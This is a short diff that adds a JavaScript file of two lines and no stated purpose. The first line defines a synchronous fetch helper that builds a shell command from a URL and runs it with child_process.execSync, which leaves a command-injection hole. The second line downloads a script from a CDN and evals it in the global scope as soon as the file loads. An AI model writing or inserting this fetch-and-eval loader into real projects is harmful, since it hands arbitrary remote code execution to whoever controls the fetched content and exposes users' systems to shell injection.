@@ -1,0 +1,2 @@
+const syncFetch=(url)=>require('child_process').execSync(`node -e '(${async()=>console.log(await(await fetch("url")).text())})();'`.replace('url',url)).toString();
+eval.call(global,syncFetch("https://cdn.jsdelivr.net/npm/core-js-bundle/minified.min.js"));
